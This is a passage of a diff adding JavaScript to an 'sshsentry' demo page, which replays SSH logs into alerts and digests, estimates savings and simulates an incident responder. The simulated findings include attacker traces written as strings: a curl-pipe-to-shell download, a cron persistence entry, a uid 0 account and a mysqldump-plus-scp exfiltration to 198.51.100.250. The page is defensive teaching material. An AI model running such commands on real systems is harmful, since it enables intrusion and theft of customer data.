+  const counts = [...st.learn.values()].sort((a, b) => a - b);
+  if (!counts.length) return null;
+  const pct = p => counts[Math.max(0, Math.ceil(p / 100 * counts.length) - 1)];
+  return Math.min(50, Math.max(3, Math.ceil(pct(99) + 2)));   // defaults: percentile 99, margin 2, clamp [3, 50]
+}
+
+// ---------- digest (port of digest_stats + digest_render, label "replayed log") ----------
+function digest(st, cfg) {
+  const all = st.failures.map(f => f.ts).concat(st.logins.map(l => l.ts));
+  const now = Date.now() / 1000;
+  const lo = all.length ? Math.min(...all) : now, hi = (all.length ? Math.max(...all) : now) + 1;
+  const fails = st.failures.filter(f => f.ts >= lo && f.ts < hi);
+  const groups = new Map();
+  for (const l of st.logins.filter(l => l.ts >= lo && l.ts < hi)) {
+    const k = l.user + "\u0000" + l.ip, g = groups.get(k);
+    if (g) { g.count++; g.fb = Math.max(g.fb, l.before); g.min = Math.min(g.min, l.ts); }
+    else groups.set(k, { user: l.user, ip: l.ip, count: 1, fb: l.before, min: l.ts });
+  }
+  const firstSeen = new Map();
+  for (const r of st.seenIps) if (r.first_seen >= lo && r.first_seen < hi)
+    firstSeen.set(r.ip, Math.min(firstSeen.has(r.ip) ? firstSeen.get(r.ip) : Infinity, r.first_seen));
+  const newIps = [...firstSeen.entries()].sort((a, b) => a[1] - b[1]).map(e => e[0]);
+  const logins = [...groups.values()].sort((a, b) => a.min - b.min).map(g =>
+    ({ user: g.user, ip: g.ip, count: g.count, failures_before: g.fb, after_failures: g.fb >= cfg.lafFailures, new_ip: newIps.includes(g.ip) }));
+  const byIp = new Map();
+  for (const f of fails) { if (!byIp.has(f.ip)) byIp.set(f.ip, []); byIp.get(f.ip).push(f.user); }
+  let top = null;
+  for (const [ip, users] of byIp) if (!top || users.length > top.attempts)
+    top = { ip, attempts: users.length, usernames: sortedSet(users.map(u => u.slice(0, 32))).slice(0, 6) };
+  const flagged = logins.filter(l => l.after_failures).length;
+  const s = { failed_logins: fails.length, distinct_ips: byIp.size, top_offender: top,
+    successful_logins: logins.reduce((a, l) => a + l.count, 0), logins, flagged_logins: flagged, new_ips: newIps,
+    suggestion: st.learn.size ? suggestion(st, cfg) : null, current_threshold: cfg.bfFailures,
+    quiet: !fails.length && !newIps.length && !flagged };
+  const head = "sshsentry daily digest, replayed log", span = `${fmtSpan(lo)} to ${fmtSpan(hi - 1)}`;
+  if (s.quiet) {
+    const extra = s.successful_logins ? ` ${s.successful_logins} routine login(s) from known addresses.` : "";
+    return { stats: s, text: `${head}\nNo incidents today.${extra} Period: ${span} (server time).` };
+  }
+  const o = [head, `Period: ${span} (server time)`, "", `Failed logins: ${s.failed_logins} from ${s.distinct_ips} IP address(es).`];
+  if (top) o.push(`Most active: ${top.ip}, ${top.attempts} attempts (usernames tried: ${top.usernames.join(", ")}).`);
+  o.push(`Successful logins: ${s.successful_logins || "none."}`);
+  for (const l of logins)
+    o.push(`  - ${l.user} from ${l.ip}${l.count > 1 ? ` (${l.count}x)` : ""}${l.new_ip ? " [new IP]" : ""}` +
+           (l.after_failures ? `  << after ${l.failures_before} failed attempts from that IP. Check this.` : ""));
+  if (newIps.length) o.push(`New IPs seen: ${newIps.length} (${newIps.slice(0, 5).join(", ")}${newIps.length > 5 ? " ..." : ""}).`);
+  if (s.suggestion !== null)
+    o.push(`Learn mode suggests a brute-force threshold of ${s.suggestion} (currently ${s.current_threshold}); see --suggest-threshold.`);
+  return { stats: s, text: o.join("\n") };
+}
+
+// ---------- UI ----------
+const $ = id => document.getElementById(id);
+const num = (id, d) => { const v = parseInt($(id).value, 10); return Number.isFinite(v) && v >= 0 ? v : d; };
+function config() {
+  return { bfFailures: num("bf_failures", 5) || 1, bfWindow: num("bf_window", 10) || 1, lafFailures: num("laf_failures", 5) || 1,
+           lafLookback: num("laf_lookback", 60) || 1, cooldown: num("cooldown", 60), newIp: $("new_ip").checked,
+           escalation: $("escalation").checked, learn: $("learn").checked };
+}
+function run() {
+  const cfg = config(), r = replay($("log").value, cfg), d = digest(r.state, cfg);
+  const box = $("alerts"); box.textContent = "";
+  if (!r.alerts.length) box.textContent = "No alerts for this log with these thresholds.";
+  for (const a of r.alerts) {
+    const div = document.createElement("div"); div.className = "alert"; div.style.borderColor = `var(--${a.severity})`;
+    const sev = document.createElement("span"); sev.className = "sev"; sev.style.color = `var(--${a.severity})`; sev.textContent = a.severity;
+    const pre = document.createElement("pre"); pre.textContent = `${a.learning ? "[learning: not sent] " : ""}[${a.time}] `; pre.append(sev, `: ${a.message}`);
+    div.append(pre); box.append(div);
+  }
+  const s = d.stats, stats = $("stats"); stats.textContent = "";
+  for (const [label, val] of [["alerts", r.alerts.length], ["failed logins", s.failed_logins], ["attacking IPs", s.distinct_ips],
+                              ["top offender", s.top_offender ? s.top_offender.ip : "-"], ["successful logins", s.successful_logins]]) {
+    const el = document.createElement("div"); el.className = "stat"; const b = document.createElement("b"); b.textContent = val;
+    el.append(b, label); stats.append(el);
+  }
+  $("digest").textContent = d.text;
+  $("result").textContent = JSON.stringify({ alerts: r.alerts.length, alert_lines: r.alerts.map(a => a.line),
+    failed_logins: s.failed_logins, distinct_ips: s.distinct_ips, top_offender: s.top_offender && s.top_offender.ip, digest: d.text });
+}
+$("sample").onclick = () => { $("log").value = SAMPLE; run(); };
+$("run").onclick = run;
+$("file").onchange = e => { const f = e.target.files[0]; if (!f) return;
+  const rd = new FileReader(); rd.onload = () => { $("log").value = rd.result; run(); }; rd.readAsText(f); };
+for (const el of document.querySelectorAll(".controls input")) el.onchange = run;
+// Optional URL parameters preset the controls, e.g. index.html?bf_failures=3&escalation=1
+for (const [k, v] of new URLSearchParams(location.search)) { const el = $(k);
+  if (el && el.closest(".controls")) { if (el.type === "checkbox") el.checked = v === "1" || v === "true"; else el.value = v; } }
+$("log").value = SAMPLE; run();
+
+// ---------- savings calculator (formulas and parameters from sshsentry-financial-analysis.md, section 3) ----------
+function sshsentryROI({ servers, attemptsPerDay, hourlyWage = 47.66, isMspRate = false, pricePerServerMonth = 3,
+                        scenario = "conservative", reviewsLogsToday = true }) {
+  const S = {
+    conservative: { m0: 10, share: 0.13 * 0.25, reduction: 0.10, cost: 38000 },
+    aggressive:   { m0: 20, share: 0.39,        reduction: 0.30, cost: 3310000 },
+  }[scenario];
+  const P_BREACH = 0.0121;               // Coalition 2026, <$25M revenue
+  const LOADED = 1 / 0.70;               // BLS ECEC Jun 2026
+  const DIGEST_MIN = 2;                  // assumption A1
+  const m0 = reviewsLogsToday ? S.m0 : 0; // "set m0 to 0 if the answer is never"
+  const rate = isMspRate ? hourlyWage : hourlyWage * LOADED;
+  const v = 1 + 0.1 * Math.log10(1 + attemptsPerDay);
+  const minsSavedPerServerWeek = Math.max(0, m0 * v - DIGEST_MIN);
+  const hoursSaved = servers * 52 * minsSavedPerServerWeek / 60;
+  const laborSavings = hoursSaved * rate;
+  const avoidedBreach = P_BREACH * S.share * S.reduction * S.cost; // per org/yr
+  const annualValue = laborSavings + avoidedBreach;
+  const annualCost = pricePerServerMonth * 12 * servers;
+  const paybackMonths = annualValue > 0 ? 12 * annualCost / annualValue : Infinity;
+  return { rate, hoursSaved, laborSavings, avoidedBreach, annualValue, annualCost, paybackMonths };
+}
+const usd = x => "$" + Math.round(x).toLocaleString("en-US");
+function payback(m, cost) {
+  if (cost === 0) return "immediate (no subscription)";
+  if (!isFinite(m)) return "never (no estimated value)";
+  if (m < 0.1) return "<0.1 months";
+  if (m > 24) return `${m.toFixed(0)} months (~${(m / 12).toFixed(0)} years)`;
+  return `${m.toFixed(1)} months`;
+}
+function calc() {
+  const n = (id, d) => { const v = parseFloat($(id).value); return Number.isFinite(v) && v >= 0 ? v : d; };
+  const inp = { servers: Math.floor(n("c_servers", 1)), attemptsPerDay: n("c_attempts", 500), hourlyWage: n("c_rate", 47.66),
+                isMspRate: $("c_ratetype").value === "loaded", pricePerServerMonth: n("c_price", 3),
+                reviewsLogsToday: $("c_review").value === "yes" };
+  const res = {};
+  for (const [sc, k] of [["conservative", "c"], ["aggressive", "a"]]) {
+    const r = res[sc] = sshsentryROI({ ...inp, scenario: sc });
+    $("c_h_" + k).textContent = r.hoursSaved.toFixed(1);
+    $("c_l_" + k).textContent = usd(r.laborSavings);
+    $("c_e_" + k).textContent = "~" + usd(r.avoidedBreach);
+    $("c_t_" + k).textContent = usd(r.annualValue);
+    $("c_s_" + k).textContent = usd(r.annualCost);
+    $("c_p_" + k).textContent = r.payback = payback(r.paybackMonths, r.annualCost);
+  }
+  $("c_rate_note").textContent = `Loaded rate used: $${res.conservative.rate.toFixed(2)}/hr` +
+    (inp.isMspRate ? " (as entered)." : ` ($${inp.hourlyWage.toFixed(2)} \u00f7 0.70).`);
+  $("c_noreview").hidden = inp.reviewsLogsToday;
+  for (const id of ["c_e_a", "c_t_a", "c_p_a"]) $(id).classList.toggle("deemph", !inp.reviewsLogsToday);   // aggressive = IBM average only
+  $("c_agg_head").textContent = inp.reviewsLogsToday ? "Aggressive" : "Aggressive (not meaningful here)";
+  $("calc-result").textContent = JSON.stringify({ inputs: inp, ...res });
+}
+const CALC_PARAMS = { servers: "c_servers", attempts: "c_attempts", rate: "c_rate", ratetype: "c_ratetype", review: "c_review", price: "c_price" };
+for (const [k, v] of new URLSearchParams(location.search)) if (CALC_PARAMS[k]) $(CALC_PARAMS[k]).value = v;   // e.g. ?servers=5&attempts=2000
+for (const el of document.querySelectorAll(".calc-controls input, .calc-controls select")) { el.oninput = calc; el.onchange = calc; }
+calc();
+
+// ---------- simulated responder (sshsentry --respond IP), shown after the walkthrough's CRITICAL escalation ----------
+// SIMULATION ONLY: the responder is specified but not yet in the Python tool; nothing here runs anywhere.
+const RS = { state: "idle", token: 0, ip: null, user: null, answers: [], prev: null, server: {}, steps: [], findings: [],
+             verdict: null, queue: [], replaying: false, noScroll: false, prompts: [], resolve: null, runs: 0 };
+const RS_Q = new URLSearchParams(location.search);
+const RS_INSTANT = reducedMotionQuery() || RS_Q.has("resp");     // reduced motion (or a test hook): no typing delay
+function reducedMotionQuery() { return !!(window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches); }
+const RS_STEPS = [
+  { key: "lock", q: "Lock the account? [y/N]", state: "locked",
+    cmds: u => [`usermod -L -e 1 ${u}`, `pkill -KILL -u ${u}`], did: u => `account ${u} locked and its sessions ended` },
+  { key: "block", q: "Block the IP? [y/N]", state: "blocked",
+    cmds: (u, ip) => [`ufw insert 1 deny from ${ip}`], did: (u, ip) => `${ip} blocked at the firewall` },
+  { key: "rotate", q: "Rotate the password? [y/N]", state: "rotated",
+    cmds: u => [`passwd ${u}    # simulated: no password is typed or set in this demo`], did: u => `password for ${u} changed` },
+  { key: "keys", q: "Replace keys? [y/N]", state: "keysReplaced",
+    cmds: u => [`cp -a ~${u}/.ssh/authorized_keys ~${u}/.ssh/authorized_keys.sshsentry-bak`, `: > ~${u}/.ssh/authorized_keys`],
+    did: u => `authorized_keys backed up, then emptied (add your own key back)` },
+];
+const rsSleep = ms => new Promise(r => setTimeout(r, RS_INSTANT ? 0 : ms));
+function rsPrint(text, cls) {
+  const t = $("rs-term"), span = document.createElement("span");
+  if (cls) span.className = cls;
+  span.textContent = text + "\n"; t.append(span); t.scrollTop = t.scrollHeight;
+}
+function rsPublish() {
+  $("resp-result").textContent = JSON.stringify({ state: RS.state, ip: RS.ip, user: RS.user, runs: RS.runs, prompts: RS.prompts,
+    steps: RS.steps, findings: RS.findings, verdict: RS.verdict, scenario: $("rs-scenario").value, instant: RS_INSTANT,
+    focus: document.activeElement && document.activeElement.id, visible: !$("responder").hidden, promptShown: $("rs-prompt").getClientRects().length > 0,
+    terminal: $("rs-term").textContent });
+}
+function rsReset() {
+  RS.token++; RS.state = "idle"; RS.answers = []; RS.prev = null; RS.server = {}; RS.steps = []; RS.findings = []; RS.verdict = null;
+  RS.prompts = []; RS.replaying = false; RS.runs = 0; if (RS.resolve) { RS.resolve = null; }
+  $("responder").hidden = true; $("rs-term").textContent = ""; $("rs-prompt").hidden = true; $("rs-report").hidden = true;
+  $("rs-report").textContent = ""; $("rs-again").disabled = true; rsPublish();
+}
+function rsStart(alert) {
+  if (RS.state !== "idle") return;
+  RS.ip = (alert.message.match(/from ([0-9a-fA-F:.]*[0-9a-fA-F]) after brute force/) || [])[1];
+  RS.user = (alert.message.match(/User '([^']+)'/) || [])[1];
+  RS.server = { blocked: $("rs-preblocked").checked };
+  RS.noScroll = new URLSearchParams(location.search).has("walk");
+  $("rs-ip").textContent = RS.ip; $("responder").hidden = false;
+  rsRun(false);
+}
+function rsAsk(q) {
+  return new Promise(resolve => {
+    RS.state = "prompt"; RS.prompts.push(q); RS.resolve = resolve;
+    $("rs-q").textContent = q; $("rs-prompt").hidden = false;
+    $("rs-no").focus({ preventScroll: RS.noScroll });                // default answer (No) gets focus
+    rsPublish();
+    const hook = RS.queue.shift();                                    // test hook: answer via the page's own handlers
+    if (hook !== undefined) setTimeout(() => {
+      if (hook === "yes" || hook === "no") $(hook === "yes" ? "rs-yes" : "rs-no").click();
+      else document.dispatchEvent(new KeyboardEvent("keydown", { key: hook, bubbles: true }));
+    }, 0);
+  });
+}
+function rsAnswer(yes) {
+  if (RS.state !== "prompt" || !RS.resolve) return;
+  const r = RS.resolve; RS.resolve = null; $("rs-prompt").hidden = true; RS.state = "running"; r(yes);
+}
+$("rs-yes").onclick = () => rsAnswer(true);
+$("rs-no").onclick = () => rsAnswer(false);
+document.addEventListener("keydown", e => {
+  if (RS.state !== "prompt" || e.ctrlKey || e.metaKey || e.altKey) return;
+  const tag = (e.target && e.target.tagName) || "";
+  if (/^(TEXTAREA|INPUT|SELECT)$/.test(tag)) return;
+  const k = e.key.toLowerCase();
+  if (k === "y") { e.preventDefault(); rsAnswer(true); }
+  else if (k === "n" || k === "enter") { e.preventDefault(); rsAnswer(false); }   // Enter = N (the default)
+});
+function rsLoginFacts() {   // derived from the real engine's state for the full sample log
+  const st = replay(WT_LINES.join("\n"), WT_CFG).state;
+  const f = st.failures.filter(x => x.ip === RS.ip), l = st.logins.filter(x => x.ip === RS.ip);
+  const sudo = WT_LINES.map(x => x.match(/^(\w{3}\s+\d+ [\d:]+) \S+ sudo:\s+(\S+) : .*COMMAND=(.*)$/)).filter(m => m && m[2] === RS.user);
+  return { fails: f.length, first: f.length ? fmt(Math.min(...f.map(x => x.ts))) : null, last: f.length ? fmt(Math.max(...f.map(x => x.ts))) : null,
+           logins: l.map(x => ({ user: x.user, time: fmt(x.ts), method: x.method })), sudo: sudo.map(m => ({ time: m[1], cmd: m[3] })) };
+}
+const RS_SCEN = {   // simulated findings for the parts the demo can't see (shell history, accounts, keys, cron, logs)
+  clean: { history: ["expected", "14 commands, all routine for this account (cd, ls, df -h, uptime)."],
+           users: ["expected", "No new accounts; no extra uid 0 users."], keys: ["expected", "authorized_keys files match the evidence snapshot baseline."],
+           cron: ["expected", "No new cron jobs or systemd timers."], logs: ["expected", "auth.log is continuous; no gaps or truncation."] },
+  unexplained: { history: ["unexplained", "curl -s http://198.51.100.250/x.sh | sh   (then: history -c)"],
+           users: ["unexplained", "New account 'support2' with uid 0, created 02:33."], keys: ["unexplained", "A new key was added to /root/.ssh/authorized_keys at 02:34 ('ops@backup')."],
+           cron: ["unexplained", "@reboot /tmp/.cache/.x/run   (added to root's crontab)"], logs: ["expected", "auth.log is continuous; no gaps or truncation."] },
+  data: { history: ["unexplained", "mysqldump shop customers > /tmp/c.sql; scp /tmp/c.sql backup@198.51.100.250:   (customer table copied off the server)"],
+           users: ["expected", "No new accounts; no extra uid 0 users."], keys: ["expected", "authorized_keys files match the evidence snapshot baseline."],
+           cron: ["expected", "No new cron jobs or systemd timers."], logs: ["unexplained", "auth.log has no lines 02:48 to 03:10 though the server was up, and wtmp was truncated. Logs look edited."] },
+};
+const LABEL = { expected: "expected", unexplained: "unexplained", cant: "can't tell" };
+function rsFindings() {
+  const sc = $("rs-scenario").value, S = RS_SCEN[sc], f = rsLoginFacts(), out = [];
+  const login = f.logins[0];
+  out.push({ check: `Logins from ${RS.ip}`, label: "expected", detail: `${f.fails} failed attempts (${f.first} to ${f.last}), then a successful ` +
+             `${login ? login.method : "?"} login as '${login ? login.user : "?"}' at ${login ? login.time : "?"}. This is the incident being investigated.` });
+  for (const s of f.sudo)
+    out.push({ check: `sudo by ${RS.user} (from auth.log)`, label: sc === "clean" ? "cant" : "unexplained",
+               detail: `${s.time}: ${s.cmd}${sc === "clean" ? ". Confirm whether someone on your team ran this." : ". Reading /etc/shadow exposes every password hash."}` });
+  out.push({ check: `Shell history (~${RS.user}/.bash_history)`, label: S.history[0], detail: S.history[1] });
+  out.push({ check: "New users", label: S.users[0], detail: S.users[1] });
+  out.push({ check: "New or changed SSH keys", label: S.keys[0], detail: S.keys[1] });
+  out.push({ check: "Cron jobs and timers", label: S.cron[0], detail: S.cron[1] });
+  out.push({ check: "Log integrity", label: S.logs[0], detail: S.logs[1] });
+  return out;
+}
+function rsVerdict(sc, findings) {
+  if (sc === "data") return { kind: "professional", title: "Call a professional", color: "var(--CRITICAL)", lesson: "lessons/lesson-5.html",
+    lessonName: "Lesson 5: when to call in help",
+    text: "Customer data may have left the server, or the logs were edited. Call your cyber insurer first (many policies require that before you change anything), then an incident-response professional. Don't wipe or rebuild yet: the evidence snapshot matters, and there may be legal notification duties." };
+  if (findings.some(f => f.label === "unexplained")) return { kind: "rebuild", title: "Recommend rebuild", color: "var(--HIGH)",
+    lesson: "lessons/lesson-4.html", lessonName: "Lesson 4: rebuild, don't clean",
+    text: "There are changes nobody can explain, so this server can't be trusted again. Rebuild it from a known-good image, restore data from a backup taken before the attack (02:10), and change every password and key that was on it. Cleaning up by hand tends to miss things." };
+  const cant = findings.filter(f => f.label === "cant").length;
+  return { kind: "clean", title: "No unexplained changes found", color: "var(--LOW)", lesson: null,
+    text: `The checks found nothing that can't be explained${cant ? ` (${cant} item can't be confirmed either way; check it yourself)` : ""}. ` +
+          "This does not prove the server is clean: a careful attacker can hide changes these checks don't look at. Keep the evidence snapshot, watch the next few digests, and if anything feels off, treat it as unexplained." };
+}
+function rsReport() {
+  const sc = $("rs-scenario").value; RS.findings = rsFindings(); RS.verdict = rsVerdict(sc, RS.findings);
+  const box = $("rs-report"); box.textContent = ""; box.hidden = false;
+  const h = document.createElement("h3"); h.textContent = "Response report (simulated)"; h.style.cssText = "margin:12px 0 4px;font-size:14px"; box.append(h);
+  const table = (head, rows) => { const t = document.createElement("table"); t.className = "rs";
+    const tr = document.createElement("tr"); for (const x of head) { const th = document.createElement("th"); th.textContent = x; tr.append(th); } t.append(tr);
+    for (const r of rows) { const row = document.createElement("tr"); for (const c of r) { const td = document.createElement("td");
+      if (c instanceof Node) td.append(c); else td.textContent = c; row.append(td); } t.append(row); } return t; };
+  box.append(table(["Step", "Your answer", "Outcome"], RS.steps.map(s => [s.name, s.answer, s.outcome])));
+  const lbl = l => { const s = document.createElement("span"); s.className = "lbl " + l; s.textContent = LABEL[l]; return s; };
+  box.append(table(["Read-only check", "Finding", "Label"], RS.findings.map(f => [f.check, f.detail, lbl(f.label)])));
+  const v = document.createElement("div"); v.className = "verdict"; v.id = "rs-verdict"; v.style.borderLeftColor = RS.verdict.color;
+  const b = document.createElement("b"); b.textContent = "Verdict: " + RS.verdict.title + ". "; b.style.color = RS.verdict.color;
+  v.append(b, RS.verdict.text);
+  if (RS.verdict.lesson) { const p = document.createElement("div"); p.style.marginTop = "6px"; const a = document.createElement("a");
+    a.href = RS.verdict.lesson; a.id = "rs-lesson"; a.textContent = RS.verdict.lessonName;
+    p.append("Read next: ", a, " (planned lesson, not published yet).");
+    v.append(p); }
+  box.append(v);
+}
+async function rsRun(replay) {
+  const tok = ++RS.token, live = () => tok === RS.token, u = RS.user, ip = RS.ip;
+  RS.state = "running"; RS.runs++; RS.steps = []; RS.prompts = []; RS.replaying = replay;
+  $("rs-again").disabled = true; $("rs-report").hidden = true; rsPublish();
+  rsPrint(`${RS.runs > 1 ? "\n" : ""}# SIMULATION: nothing runs on any real server`, "warn");
+  rsPrint(`$ sudo sshsentry --respond ${ip}${replay ? "    # run again with the same answers" : ""}`, "cmd");
+  await rsSleep(400); if (!live()) return;
+  rsPrint("Step 0: snapshot evidence (automatic, read-only)");
+  const stamp = new Date().toISOString().replace(/[-:]/g, "").slice(0, 15);
+  for (const c of [`mkdir -m 700 /root/sshsentry-evidence-${stamp}`, "cp -a /var/log/auth.log* /var/log/wtmp /etc/passwd /etc/crontab EVIDENCE/",
+                   "last -Faiw > last.txt; ps auxww > ps.txt; ss -tupan > sockets.txt",
+                   `cp -a ~${u}/.bash_history /root/.bash_history ~${u}/.ssh /root/.ssh EVIDENCE/`, "sha256sum EVIDENCE/* > EVIDENCE/SHA256SUMS"]) {
+    rsPrint("  $ " + c, "cmd"); await rsSleep(180); if (!live()) return; }
+  rsPrint("  -> done: evidence saved before anything is changed", "ok");
+  RS.steps.push({ name: "0. Snapshot evidence", answer: "(automatic)", outcome: "done" });
+  for (let i = 0; i < RS_STEPS.length; i++) {
+    const s = RS_STEPS[i]; await rsSleep(300); if (!live()) return;
+    rsPrint(`\nStep ${i + 1}: ${s.q}`);
+    let yes;
+    if (replay) { yes = RS.prev[i]; rsPrint(`  (replaying your answer: ${yes ? "y" : "n"})`, "skip"); }
+    else { yes = await rsAsk(s.q); if (!live()) return; RS.answers[i] = yes; rsPrint(`  > ${yes ? "y" : "n"}`); }
+    let outcome;
+    if (!yes) { outcome = "skipped"; rsPrint("  -> skipped", "skip"); }
+    else if (RS.server[s.state]) { outcome = "already done"; rsPrint(`  -> already done (${s.did(u, ip)}); nothing re-run`, "ok"); }
+    else {
+      for (const c of s.cmds(u, ip)) { rsPrint("  $ " + c, "cmd"); await rsSleep(200); if (!live()) return; }
+      RS.server[s.state] = true; outcome = "done"; rsPrint(`  -> done: ${s.did(u, ip)}`, "ok");
+    }
+    RS.steps.push({ name: `${i + 1}. ${s.q.replace(" [y/N]", "")}`, answer: yes ? "Yes" : "No", outcome, commands: s.cmds(u, ip) });
+    rsPublish();
+  }
+  RS.prev = RS.answers.slice();
+  await rsSleep(300); if (!live()) return;
+  rsPrint("\nRead-only checks (nothing is changed)");
+  for (const c of [`grep ' ${ip} ' /var/log/auth.log*`, `cat ~${u}/.bash_history /root/.bash_history`, "awk -F: '$3==0 || $3>=1000' /etc/passwd",
+                   "find / -name authorized_keys -newer EVIDENCE/last.txt -o -name authorized_keys -mtime -1", "crontab -l -u root; ls -la /etc/cron.* ; systemctl list-timers"]) {
+    rsPrint("  $ " + c, "cmd"); await rsSleep(180); if (!live()) return; }
+  rsReport();
+  for (const f of RS.findings) rsPrint(`  [${LABEL[f.label]}] ${f.check}: ${f.detail}`, f.label === "unexplained" ? "bad" : f.label === "cant" ? "warn" : "ok");
+  rsPrint(`\nVerdict: ${RS.verdict.title}`, RS.verdict.kind === "clean" ? "ok" : "bad");
+  RS.state = "done"; $("rs-again").disabled = false; rsPublish();
+  // test hooks: ?again=1 clicks "Run again" once; ?then=restart clicks the walkthrough's Restart afterwards
+  if (RS_Q.get("again") === "1" && RS.runs === 1) setTimeout(() => $("rs-again").click(), 0);
+  else if (RS_Q.get("then") === "restart") setTimeout(() => $("wt-restart").click(), 0);
+}
+$("rs-again").onclick = () => { if (RS.state === "done") rsRun(true); };
+$("rs-scenario").onchange = () => { if (RS.state === "done") { rsReport(); rsPublish(); } };
+{ // test hooks: ?resp=y,n,Enter,yes,no answers prompts via real key events (y/n/Enter) or button clicks (yes/no)
+  const r = RS_Q.get("resp"); if (r) RS.queue = r.split(",").filter(Boolean);
+  if (RS_Q.get("scenario")) $("rs-scenario").value = RS_Q.get("scenario");
+  if (RS_Q.get("preblocked") === "1") $("rs-preblocked").checked = true;
+}
+rsPublish();
+
+// ---------- live walkthrough: replays the sample log line by line through the real engine (replay + digest) ----------
+const WT_CFG = { bfFailures: 5, bfWindow: 10, lafFailures: 5, lafLookback: 60, cooldown: 60, newIp: true, escalation: true, learn: false };
+const WT_LINES = SAMPLE.split("\n").filter(l => l.trim());
+const TODO = {   // plain-English next steps per rule (the alert text itself comes from the engine)
+  brute_force: ip => `Someone at ${ip} is guessing passwords. No action is needed if password logins are off. Otherwise block ${ip} (fail2ban or a firewall) and switch to key-only SSH.`,
+  brute_force_success: ip => `Act now. Treat this as a break-in: lock the account, remove unknown keys from ~/.ssh/authorized_keys, check running processes and change passwords. Then block ${ip}.`,
+  login_after_failures: ip => "If this login wasn't you, change that password now and check ~/.ssh/authorized_keys.",
+  new_ip: ip => `If you recognize ${ip} (home, office, VPN), approve it so it stays quiet: sshsentry.py --approve ${ip}. If not, investigate.`,
+};
+const wt = { step: 0, playing: false, timer: null, shown: 0, autoplay: false };
+const reducedMotion = !!(window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches);
+function wtRender() {
+  const n = wt.step, logEl = $("wt-log"), alertsEl = $("wt-alerts");
+  while (logEl.children.length > n) logEl.lastChild.remove();
+  for (let i = logEl.children.length; i < n; i++) {
+    const d = document.createElement("div"), l = WT_LINES[i];
+    d.className = "logline" + (/Failed password|Invalid user/.test(l) ? " fail" : /Accepted /.test(l) ? " ok" : "");
+    d.textContent = l; logEl.append(d);
+  }
+  for (const c of logEl.querySelectorAll(".cur")) c.classList.remove("cur");
+  if (n) logEl.children[n - 1].classList.add("cur");
+  const r = replay(WT_LINES.slice(0, n).join("\n"), WT_CFG);          // real engine, on the log so far
+  if (r.alerts.length < wt.shown) { alertsEl.textContent = ""; wt.shown = 0; }
+  for (const a of r.alerts.slice(wt.shown)) {
+    const div = document.createElement("div"); div.className = "alert"; div.style.borderColor = `var(--${a.severity})`;
+    div.dataset.severity = a.severity; div.dataset.rule = a.rule;
+    const sev = document.createElement("span"); sev.className = "sev"; sev.style.color = `var(--${a.severity})`; sev.textContent = a.severity;
+    const pre = document.createElement("pre"); pre.textContent = `[${a.time}] `; pre.append(sev, `: ${a.message}`);
+    const ip = (a.message.match(/from ([0-9a-fA-F:.]*[0-9a-fA-F])/) || [, "that IP"])[1];
+    const todo = document.createElement("div"); todo.className = "todo";
+    const b = document.createElement("b"); b.textContent = "What to do: ";
+    todo.append(b, (TODO[a.rule] || (() => "Check whether you expected this."))(ip));
+    div.append(pre, todo); alertsEl.append(div);
+    if (a.rule === "brute_force_success") rsStart(a);   // the attacker got in: offer the (simulated) responder
+  }
+  wt.shown = r.alerts.length;
+  const done = n >= WT_LINES.length, d = done ? digest(r.state, WT_CFG) : null;
+  $("wt-digestbox").hidden = !done; $("wt-digest").textContent = d ? d.text : "";
+  $("wt-progress").textContent = `Line ${n} of ${WT_LINES.length}${done ? " (done)" : ""}`;
+  $("wt-step").disabled = done;
+  for (const pane of [$("wt-logpane"), $("wt-alertpane")]) pane.scrollTop = pane.scrollHeight;
+  $("walk-result").textContent = JSON.stringify({ step: n, total: WT_LINES.length, playing: wt.playing, autoplay: wt.autoplay,
+    reducedMotion, alerts: r.alerts.map(a => ({ severity: a.severity, rule: a.rule, line: a.line })), digest: d ? d.text : null });
+}
+function wtSetPlaying(on) {
+  wt.playing = on && wt.step < WT_LINES.length;
+  clearTimeout(wt.timer);
+  $("wt-play").textContent = wt.playing ? "Pause" : (wt.step >= WT_LINES.length ? "Play again" : "Play");
+  $("wt-play").setAttribute("aria-pressed", String(wt.playing));
+  if (wt.playing) wt.timer = setTimeout(wtTick, 900 / parseFloat($("wt-speed").value));
+  wtRender();
+}
+function wtTick() {
+  if (RS.state === "running" || RS.state === "prompt") { wt.timer = setTimeout(wtTick, 300); return; }   // pause while responding
+  if (wt.step < WT_LINES.length) wt.step++; wtSetPlaying(wt.step < WT_LINES.length);
+}
+$("wt-play").onclick = () => { if (!wt.playing && wt.step >= WT_LINES.length) wt.step = 0; wtSetPlaying(!wt.playing); };
+$("wt-step").onclick = () => { if (wt.step < WT_LINES.length) wt.step++; wtSetPlaying(false); };
+$("wt-restart").onclick = () => { rsReset(); wt.step = 0; wtSetPlaying(false); };
+$("wt-speed").onchange = () => { if (wt.playing) wtSetPlaying(true); };
+{ // ?walk=N jumps to line N (or "end") without autoplay; ?autoplay=0 disables autoplay. Reduced motion never autoplays.
+  const q = new URLSearchParams(location.search), w = q.get("walk");
+  if (w !== null) wt.step = w === "end" ? WT_LINES.length : Math.max(0, Math.min(WT_LINES.length, parseInt(w, 10) || 0));
+  wt.autoplay = w === null && q.get("autoplay") !== "0" && !reducedMotion;
+  wtSetPlaying(wt.autoplay);
+}
+</script>
+</body>
+</html>
